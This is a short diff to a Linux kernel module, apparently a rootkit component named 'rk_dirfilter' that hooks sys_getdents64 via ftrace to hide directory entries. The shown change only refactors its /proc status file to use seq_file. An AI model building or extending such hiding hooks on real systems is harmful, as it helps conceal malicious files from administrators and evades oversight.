@@ -9,6 +9,7 @@
 #include <linux/module.h>
 #include <linux/printk.h>
 #include <linux/proc_fs.h>
+#include <linux/seq_file.h>
 #include <linux/string.h>
 #include <linux/uaccess.h>
 
@@ -131,18 +132,11 @@ static void remove_hook(void)
 	ftrace_set_filter_ip(&dirfilter_ops, sys_getdents64_addr, 1, 0);
 }
 
-static ssize_t status_show(struct file *file, char __user *buffer,
-			   size_t count, loff_t *position)
+static int status_show(struct seq_file *m, void *v)
 {
-	static const char msg[] = "hidden\n";
-
-	return simple_read_from_buffer(buffer, count, position,
-				       msg, sizeof(msg) - 1);
+	seq_puts(m, "hidden\n");
+	return 0;
 }
-
-static const struct proc_ops status_ops = {
-	.proc_read = status_show,
-};
 
 static int __init dirfilter_init(void)
 {
@@ -152,7 +146,7 @@ static int __init dirfilter_init(void)
 	if (err)
 		return err;
 
-	proc_entry = proc_create("rk_dirfilter", 0444, NULL, &status_ops);
+	proc_entry = proc_create_single("rk_dirfilter", 0444, NULL, status_show);
 	if (!proc_entry) {
 		remove_hook();
 		return -ENOMEM;
